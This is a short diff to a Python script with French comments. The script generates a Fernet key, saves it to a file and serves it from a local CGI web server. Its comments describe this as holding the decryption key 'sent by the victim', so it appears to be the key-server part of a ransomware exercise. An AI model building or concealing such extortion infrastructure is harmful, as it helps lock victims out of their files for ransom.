@@ -4,14 +4,17 @@ import threading
 from cryptography.fernet import Fernet
 
 
+"""
+    Programme pour lancer le serveur hébergeant en local la clé secrète.
+"""
+
 def generate_key():
     """
-    Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
+    Génère la clé AES 128 pour chiffrer puis déchiffrer le fichier
     """
 
     key = Fernet.generate_key()
     #cryptor = Fernet(key)
-    print(key)
     f_enc = open("keyfile.txt", 'wb')
     f_enc.write(key)
     
@@ -22,8 +25,8 @@ def generate_key():
 Le serveur hébergera la clé de déchiffrement envoyé par la victime.
 """
 generate_key()
-port = 8080
-server_address = ("127.0.0.1", port) #Création d'un serveur web en localhost
+port = 8080 # port classique http légèrement dissimulé
+server_address = ("127.0.0.1", port) #Création d'un serveur web en localhost soit 127.0.0.1
 server = http.server.HTTPServer
 handler = http.server.CGIHTTPRequestHandler
 handler.cgi_directories = ["./"]
